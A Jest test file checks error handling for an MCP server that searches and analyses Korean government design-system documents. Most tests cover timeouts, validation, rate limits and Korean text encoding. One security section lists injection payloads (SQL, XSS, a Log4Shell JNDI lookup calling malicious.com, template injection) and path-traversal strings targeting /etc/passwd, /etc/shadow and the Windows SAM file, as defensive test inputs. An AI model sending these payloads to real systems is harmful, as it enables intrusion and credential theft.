/**
 * Comprehensive Error Handling Integration Tests
 * 
 * These tests verify error handling across all KRDS MCP tools and scenarios:
 * - Network connectivity errors
 * - Invalid parameter validation
 * - Server timeout scenarios
 * - Rate limiting enforcement
 * - Resource exhaustion handling
 * - Malformed data processing
 * - Security validation errors
 * - Korean text encoding issues
 * - Memory and performance limits
 * - Recovery and retry mechanisms
 * 
 * @author KRDS MCP Server Test Suite
 * @version 1.0.0
 */

import { jest } from '@jest/globals';
import { McpError, ErrorCode } from '@modelcontextprotocol/sdk/types.js';
import { MockMCPServer, MockMCPClient, createMockMCPServer, createMockMCPClient } from '../helpers/mock-mcp-server.js';
import { mockKrdsDocument } from '../mock-data/krds-mock-data.js';

describe('Comprehensive Error Handling Tests', () => {
  let mockServer: MockMCPServer;
  let mockClient: MockMCPClient;

  beforeEach(() => {
    mockServer = createMockMCPServer();
    mockClient = createMockMCPClient(mockServer);
    mockServer.clearRequestLog();
    mockServer.resetRateLimit();
    mockServer.setErrorMode(false);
    mockServer.setNetworkDelay(0);
  });

  afterEach(() => {
    mockServer.removeAllListeners();
  });

  describe('Network and Connectivity Errors', () => {
    it('should handle server unavailable errors', async () => {
      mockServer.setErrorMode(true);
      
      const tools = ['search_documents', 'retrieve_content', 'navigate_site', 
                     'process_images', 'export_documents', 'analyze_korean_text'];

      for (const toolName of tools) {
        try {
          await mockClient.callTool(toolName, getValidParamsForTool(toolName));
          fail(`Expected error was not thrown for tool: ${toolName}`);
        } catch (error) {
          expect(error).toBeInstanceOf(McpError);
          expect((error as McpError).code).toBe(ErrorCode.InternalError);
          expect(error.message).toContain('Server error');
        }
      }
    });

    it('should handle network timeout scenarios', async () => {
      mockServer.setNetworkDelay(30000); // 30 second delay
      
      const timeoutTests = [
        { tool: 'search_documents', params: { query: '테스트', timeout: 1000 } },
        { tool: 'analyze_korean_text', params: { action: 'normalize', text: '테스트', timeout: 1000 } },
        { tool: 'process_images', params: { imageUrl: 'https://test.kr/slow.png', timeout: 1000 } },
      ];

      for (const test of timeoutTests) {
        const startTime = Date.now();
        
        try {
          const result = await mockClient.callTool(test.tool, test.params);
          // If it succeeds, verify it took the expected time
          const endTime = Date.now();
          expect(endTime - startTime).toBeGreaterThanOrEqual(1000);
        } catch (error) {
          // Timeout errors are acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle intermittent connectivity issues', async () => {
      let requestCount = 0;
      
      // Set up intermittent failures (every other request fails)
      const originalCallTool = mockClient.callTool;
      mockClient.callTool = jest.fn().mockImplementation(async (name, args) => {
        requestCount++;
        if (requestCount % 2 === 0) {
          throw new McpError(ErrorCode.InternalError, 'Intermittent network error');
        }
        return originalCallTool.call(mockClient, name, args);
      });

      // Test retry logic
      for (let i = 0; i < 5; i++) {
        try {
          await mockClient.callTool('search_documents', { query: `테스트 ${i}` });
          // Successful requests should work
        } catch (error) {
          // Failed requests should be handled gracefully
          expect(error).toBeInstanceOf(McpError);
          expect(error.message).toContain('network error');
        }
      }

      expect(requestCount).toBeGreaterThan(0);
    });

    it('should handle DNS resolution failures', async () => {
      const invalidUrls = [
        'https://nonexistent-domain-12345.kr/document',
        'https://invalid.krds.invalid/policy',
        'https://malformed-url-test.invalid.domain/content',
      ];

      for (const url of invalidUrls) {
        try {
          const result = await mockClient.callTool('retrieve_content', { url });
          // Mock server might not simulate DNS failures, but should handle gracefully
          const response = JSON.parse(result.content[0].text);
          expect(response.success).toBe(true); // Mock allows any URL
        } catch (error) {
          // DNS errors are acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Parameter Validation Errors', () => {
    it('should validate required parameters across all tools', async () => {
      const invalidParams = [
        { tool: 'search_documents', params: {} }, // Missing query
        { tool: 'retrieve_content', params: {} }, // Missing url
        { tool: 'navigate_site', params: {} }, // Missing action
        { tool: 'process_images', params: {} }, // Missing imageUrl or documentId
        { tool: 'export_documents', params: { format: 'json' } }, // Missing documents
        { tool: 'analyze_korean_text', params: { text: '테스트' } }, // Missing action
      ];

      for (const test of invalidParams) {
        const result = await mockClient.callTool(test.tool, test.params);
        const response = JSON.parse(result.content[0].text);
        
        expect(response.success).toBe(false);
        expect(response.error).toBeDefined();
        expect(typeof response.error).toBe('string');
      }
    });

    it('should validate parameter types and ranges', async () => {
      const typeValidationTests = [
        { 
          tool: 'search_documents', 
          params: { query: '테스트', maxResults: 'invalid' }, // Should be number
        },
        { 
          tool: 'search_documents', 
          params: { query: '테스트', maxResults: -5 }, // Should be positive
        },
        {
          tool: 'analyze_korean_text',
          params: { action: 'extract_keywords', text: '테스트', maxKeywords: 1000 }, // Exceeds limit
        },
        {
          tool: 'export_documents',
          params: { documents: [mockKrdsDocument()], format: 'invalid_format' },
        },
        {
          tool: 'process_images',
          params: { imageUrl: 'not-a-url', ocrEnabled: 'not-boolean' },
        },
      ];

      for (const test of typeValidationTests) {
        const result = await mockClient.callTool(test.tool, test.params);
        const response = JSON.parse(result.content[0].text);
        
        expect(response.success).toBe(false);
        expect(response.error).toBeDefined();
      }
    });

    it('should validate string length limits', async () => {
      const longString = '매우 긴 한국어 텍스트 '.repeat(10000); // Very long text
      
      const lengthTests = [
        { tool: 'search_documents', params: { query: longString } },
        { tool: 'analyze_korean_text', params: { action: 'normalize', text: longString } },
        { tool: 'navigate_site', params: { action: 'browse_category', category: longString } },
      ];

      for (const test of lengthTests) {
        const result = await mockClient.callTool(test.tool, test.params);
        const response = JSON.parse(result.content[0].text);
        
        // Should either handle gracefully or return validation error
        if (!response.success) {
          expect(response.error).toContain('too long' || 'length' || 'limit');
        }
      }
    });

    it('should handle null and undefined parameters', async () => {
      const nullTests = [
        { tool: 'search_documents', params: { query: null } },
        { tool: 'retrieve_content', params: { url: undefined } },
        { tool: 'analyze_korean_text', params: { action: 'normalize', text: null } },
      ];

      for (const test of nullTests) {
        try {
          const result = await mockClient.callTool(test.tool, test.params);
          const response = JSON.parse(result.content[0].text);
          expect(response.success).toBe(false);
        } catch (error) {
          // Type errors are acceptable for null/undefined
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Rate Limiting and Resource Management', () => {
    it('should enforce rate limits across tools', async () => {
      mockServer.setRateLimit(2); // Allow only 2 requests
      
      const tools = ['search_documents', 'navigate_site', 'analyze_korean_text'];
      let successCount = 0;
      let errorCount = 0;

      for (const tool of tools) {
        try {
          await mockClient.callTool(tool, getValidParamsForTool(tool));
          successCount++;
        } catch (error) {
          errorCount++;
          expect(error).toBeInstanceOf(McpError);
          expect((error as McpError).code).toBe(ErrorCode.InternalError);
        }
      }

      expect(successCount).toBeLessThanOrEqual(2);
      expect(errorCount).toBeGreaterThan(0);
    });

    it('should handle memory exhaustion scenarios', async () => {
      const largeDataTests = [
        {
          tool: 'export_documents',
          params: {
            documents: Array.from({ length: 10000 }, (_, i) => mockKrdsDocument({ id: `large-${i}` })),
            format: 'json',
          },
        },
        {
          tool: 'analyze_korean_text',
          params: {
            action: 'extract_keywords',
            text: '대용량 텍스트 처리 '.repeat(50000),
            maxKeywords: 1000,
          },
        },
      ];

      for (const test of largeDataTests) {
        try {
          const result = await mockClient.callTool(test.tool, test.params);
          const response = JSON.parse(result.content[0].text);
          
          // Should either succeed or fail gracefully
          if (!response.success) {
            expect(response.error).toBeDefined();
          }
        } catch (error) {
          // Memory errors are acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle concurrent request limits', async () => {
      const concurrentRequests = Array.from({ length: 50 }, (_, i) => 
        mockClient.callTool('search_documents', { query: `동시 요청 ${i}` })
      );

      try {
        const results = await Promise.all(concurrentRequests);
        
        // All requests should complete (mock server allows high concurrency)
        expect(results).toHaveLength(50);
        
        results.forEach(result => {
          expect(result.content).toBeDefined();
          const response = JSON.parse(result.content[0].text);
          expect(response.success).toBe(true);
        });
      } catch (error) {
        // Concurrent limits are acceptable
        expect(error).toBeDefined();
      }
    });

    it('should handle queue overflow scenarios', async () => {
      // Simulate request queue overflow
      const rapidRequests = Array.from({ length: 100 }, (_, i) => 
        mockClient.callTool('process_images', {
          imageUrl: `https://v04.krds.go.kr/images/rapid-${i}.png`,
        })
      );

      const results = await Promise.allSettled(rapidRequests);
      
      let fulfilled = 0;
      let rejected = 0;
      
      results.forEach(result => {
        if (result.status === 'fulfilled') {
          fulfilled++;
        } else {
          rejected++;
        }
      });

      expect(fulfilled + rejected).toBe(100);
      // Some requests should succeed, others may be queued or rejected
    });
  });

  describe('Data Processing Errors', () => {
    it('should handle malformed Korean text', async () => {
      const malformedTexts = [
        '한글\x00바이너리\x01데이터', // Null bytes
        '불완전한\uD800유니코드', // Incomplete surrogate pairs
        'ᄀᄁᄂᄃᄄᄅᄆᄇᄈᄉᄊᄋᄌᄍᄎᄏᄐᄑᄒ', // Only consonants
        'ᅡᅢᅣᅤᅥᅦᅧᅨᅩᅪᅫᅬᅭᅮᅯᅰᅱᅲᅳᅴᅵ', // Only vowels
        '🇰🇷🎌🎯🎪🎨🎭🎬🎵🎶🎼🎹🎸🎺🎻', // Emoji
      ];

      for (const text of malformedTexts) {
        const result = await mockClient.callTool('analyze_korean_text', {
          action: 'normalize',
          text,
        });
        
        const response = JSON.parse(result.content[0].text);
        
        // Should handle malformed text gracefully
        if (!response.success) {
          expect(response.error).toBeDefined();
        } else {
          expect(response.result.normalizedText).toBeDefined();
        }
      }
    });

    it('should handle corrupted image data', async () => {
      const corruptedImageUrls = [
        'https://v04.krds.go.kr/images/corrupted.png',
        'https://v04.krds.go.kr/images/incomplete.jpg',
        'https://v04.krds.go.kr/images/zero-byte.gif',
        'https://v04.krds.go.kr/images/wrong-extension.txt',
      ];

      for (const imageUrl of corruptedImageUrls) {
        const result = await mockClient.callTool('process_images', {
          imageUrl,
          ocrEnabled: true,
        });
        
        const response = JSON.parse(result.content[0].text);
        
        // Should handle corrupted images gracefully (mock allows all URLs)
        expect(response.success).toBe(true);
        expect(response.images).toBeDefined();
      }
    });

    it('should handle invalid document structures', async () => {
      const invalidDocuments = [
        null,
        undefined,
        {},
        { invalidField: 'value' },
        { id: null, title: undefined },
        'not an object',
        123,
        [],
      ];

      for (const doc of invalidDocuments) {
        try {
          const result = await mockClient.callTool('export_documents', {
            documents: [doc as any],
            format: 'json',
          });
          
          const response = JSON.parse(result.content[0].text);
          // Mock server may not validate document structure strictly
          if (!response.success) {
            expect(response.error).toBeDefined();
          }
        } catch (error) {
          // Type errors are acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle encoding and charset issues', async () => {
      const encodingTests = [
        'UTF-8: 한국어 텍스트',
        'Latin-1: Caf\u00e9', 
        'Windows-1252: Smart "quotes"',
        'Mixed: 한글ABC123日本語',
        'Control chars: \t\n\r\f\v',
      ];

      for (const text of encodingTests) {
        const result = await mockClient.callTool('analyze_korean_text', {
          action: 'normalize',
          text,
        });
        
        const response = JSON.parse(result.content[0].text);
        expect(response.success).toBe(true);
        expect(response.result.normalizedText).toBeDefined();
      }
    });
  });

  describe('Security and Input Sanitization', () => {
    it('should prevent code injection attacks', async () => {
      const injectionAttempts = [
        '"; DROP TABLE documents; --',
        '<script>alert("XSS")</script>',
        '${jndi:ldap://malicious.com/a}',
        '{{7*7}}',
        'javascript:alert(document.cookie)',
        'data:text/html,<script>alert("XSS")</script>',
      ];

      for (const maliciousInput of injectionAttempts) {
        const tools = ['search_documents', 'analyze_korean_text', 'navigate_site'];
        
        for (const tool of tools) {
          const result = await mockClient.callTool(tool, 
            getValidParamsForTool(tool, maliciousInput)
          );
          
          const response = JSON.parse(result.content[0].text);
          
          // Should handle malicious input safely
          expect(response.success).toBe(true);
          
          // Verify no code execution occurred
          expect(JSON.stringify(response)).not.toContain('<script>');
          expect(JSON.stringify(response)).not.toContain('DROP TABLE');
        }
      }
    });

    it('should validate file path traversal attempts', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
      ];

      for (const path of pathTraversalAttempts) {
        try {
          const result = await mockClient.callTool('retrieve_content', {
            url: `https://v04.krds.go.kr/documents/${path}`,
          });
          
          const response = JSON.parse(result.content[0].text);
          // Should handle path traversal safely
          expect(response.success).toBe(true);
        } catch (error) {
          // Security errors are acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should handle oversized request payloads', async () => {
      const oversizedPayloads = [
        {
          tool: 'search_documents',
          params: {
            query: 'A'.repeat(1000000), // 1MB query
          },
        },
        {
          tool: 'export_documents',
          params: {
            documents: Array.from({ length: 100000 }, () => mockKrdsDocument()),
            format: 'json',
          },
        },
      ];

      for (const test of oversizedPayloads) {
        try {
          const result = await mockClient.callTool(test.tool, test.params);
          const response = JSON.parse(result.content[0].text);
          
          // Should either handle or reject oversized payloads
          if (!response.success) {
            expect(response.error).toContain('too large' || 'size' || 'limit');
          }
        } catch (error) {
          // Payload size errors are acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Korean Language Specific Errors', () => {
    it('should handle invalid Hangul combinations', async () => {
      const invalidHangul = [
        'ㄱㅏ나ㄷㅏ', // Mixed Jamo and syllables
        '간다', // Separated Jamo components  
        '한국어\u200B텍스트', // Zero-width space
        '한\uFEFF국\uFEFF어', // Byte order marks
      ];

      for (const text of invalidHangul) {
        const result = await mockClient.callTool('analyze_korean_text', {
          action: 'romanize',
          text,
        });
        
        const response = JSON.parse(result.content[0].text);
        expect(response.success).toBe(true);
        expect(response.result.romanized).toBeDefined();
      }
    });

    it('should handle mixed script content errors', async () => {
      const mixedScripts = [
        '한국어English中文العربية',
        '정부政府Government정책',
        'データ데이터DataДанные',
        '🇰🇷한국🎌日本🇺🇸미국',
      ];

      for (const text of mixedScripts) {
        const result = await mockClient.callTool('analyze_korean_text', {
          action: 'extract_keywords',
          text,
        });
        
        const response = JSON.parse(result.content[0].text);
        expect(response.success).toBe(true);
        expect(response.result.keywords).toBeDefined();
      }
    });

    it('should handle Korean OCR errors', async () => {
      const ocrErrorScenarios = [
        'https://v04.krds.go.kr/images/low-quality-korean-text.jpg',
        'https://v04.krds.go.kr/images/handwritten-korean.png',
        'https://v04.krds.go.kr/images/faded-korean-document.pdf',
        'https://v04.krds.go.kr/images/rotated-korean-text.tiff',
      ];

      for (const imageUrl of ocrErrorScenarios) {
        const result = await mockClient.callTool('process_images', {
          imageUrl,
          ocrEnabled: true,
          koreanOcr: true,
        });
        
        const response = JSON.parse(result.content[0].text);
        expect(response.success).toBe(true);
        
        if (response.images.length > 0) {
          const image = response.images[0];
          if (image.ocrResult) {
            // OCR may have low confidence or empty text for poor quality images
            expect(image.ocrResult.confidence).toBeDefined();
            expect(typeof image.ocrResult.confidence).toBe('number');
          }
        }
      }
    });
  });

  describe('Recovery and Retry Mechanisms', () => {
    it('should implement exponential backoff for retries', async () => {
      let attemptCount = 0;
      const maxAttempts = 3;
      
      // Mock temporary failures
      const originalCallTool = mockClient.callTool;
      mockClient.callTool = jest.fn().mockImplementation(async (name, args) => {
        attemptCount++;
        if (attemptCount < maxAttempts) {
          throw new McpError(ErrorCode.InternalError, 'Temporary failure');
        }
        return originalCallTool.call(mockClient, name, args);
      });

      const startTime = Date.now();
      
      try {
        const result = await mockClient.callTool('search_documents', { query: '재시도 테스트' });
        const endTime = Date.now();
        
        // Should eventually succeed after retries
        expect(result.content).toBeDefined();
        expect(attemptCount).toBe(maxAttempts);
        
        // Should have taken time for backoff delays
        expect(endTime - startTime).toBeGreaterThan(0);
      } catch (error) {
        // If all retries fail, that's acceptable
        expect(attemptCount).toBe(maxAttempts);
      }
    });

    it('should handle partial failures in batch operations', async () => {
      const mixedDocuments = [
        mockKrdsDocument({ id: 'valid-1' }),
        null, // Invalid document
        mockKrdsDocument({ id: 'valid-2' }),
        { invalidStructure: true }, // Invalid document
        mockKrdsDocument({ id: 'valid-3' }),
      ];

      const result = await mockClient.callTool('export_documents', {
        documents: mixedDocuments as any,
        format: 'json',
      });
      
      const response = JSON.parse(result.content[0].text);
      
      // Should handle partial failures gracefully
      if (!response.success) {
        expect(response.error).toBeDefined();
      } else {
        // Should export valid documents and skip invalid ones
        expect(response.documentCount).toBeGreaterThan(0);
        expect(response.documentCount).toBeLessThan(mixedDocuments.length);
      }
    });

    it('should maintain state consistency during errors', async () => {
      // Perform operations that might fail
      const operations = [
        mockClient.callTool('search_documents', { query: '상태 일관성 테스트' }),
        mockClient.callTool('navigate_site', { action: 'list_categories' }),
        mockClient.callTool('analyze_korean_text', { action: 'normalize', text: '테스트' }),
      ];

      const results = await Promise.allSettled(operations);
      
      // After operations (successful or failed), server should remain functional
      const testResult = await mockClient.callTool('search_documents', { 
        query: '서버 상태 확인' 
      });
      
      expect(testResult.content).toBeDefined();
      const response = JSON.parse(testResult.content[0].text);
      expect(response.success).toBe(true);
    });

    it('should handle graceful degradation', async () => {
      // Simulate partial system failures
      const degradedServices = [
        { tool: 'process_images', params: { imageUrl: 'https://unavailable.kr/image.png' } },
        { tool: 'retrieve_content', params: { url: 'https://slow-response.kr/doc' } },
      ];

      for (const test of degradedServices) {
        const result = await mockClient.callTool(test.tool, test.params);
        const response = JSON.parse(result.content[0].text);
        
        // Should provide degraded service rather than complete failure
        expect(response.success).toBe(true);
        
        // May include warnings about degraded functionality
        if (response.warnings) {
          expect(Array.isArray(response.warnings)).toBe(true);
        }
      }
    });
  });

  describe('Error Reporting and Logging', () => {
    it('should provide detailed error information', async () => {
      const result = await mockClient.callTool('search_documents', {
        // Deliberately invalid parameters
        query: '',
        maxResults: -1,
      });
      
      const response = JSON.parse(result.content[0].text);
      expect(response.success).toBe(false);
      expect(response.error).toBeDefined();
      expect(typeof response.error).toBe('string');
      expect(response.error.length).toBeGreaterThan(0);
      
      // Should include helpful error details
      expect(response.error).toMatch(/query|empty|invalid|required/i);
    });

    it('should include error codes for programmatic handling', async () => {
      try {
        await mockClient.callTool('nonexistent_tool', {});
      } catch (error) {
        expect(error).toBeInstanceOf(McpError);
        expect((error as McpError).code).toBeDefined();
        expect(typeof (error as McpError).code).toBe('number');
      }
    });

    it('should maintain error correlation IDs', async () => {
      const errors: string[] = [];
      
      // Generate multiple errors
      const errorTests = [
        { tool: 'search_documents', params: {} },
        { tool: 'export_documents', params: { format: 'invalid' } },
        { tool: 'analyze_korean_text', params: { text: '' } },
      ];

      for (const test of errorTests) {
        const result = await mockClient.callTool(test.tool, test.params);
        const response = JSON.parse(result.content[0].text);
        
        if (!response.success) {
          errors.push(response.error);
        }
      }

      expect(errors.length).toBeGreaterThan(0);
      errors.forEach(error => {
        expect(error).toBeDefined();
        expect(typeof error).toBe('string');
      });
    });
  });
});

// Helper function to get valid parameters for each tool
function getValidParamsForTool(toolName: string, overrideValue?: string): any {
  const params: Record<string, any> = {
    search_documents: {
      query: overrideValue || '테스트 검색',
    },
    retrieve_content: {
      url: overrideValue || 'https://v04.krds.go.kr/test-document',
    },
    navigate_site: {
      action: 'list_categories',
      category: overrideValue || 'education',
    },
    process_images: {
      imageUrl: overrideValue || 'https://v04.krds.go.kr/images/test.png',
    },
    export_documents: {
      documents: [mockKrdsDocument()],
      format: 'json',
    },
    analyze_korean_text: {
      action: 'normalize',
      text: overrideValue || '테스트 텍스트',
    },
  };

  return params[toolName] || {};
}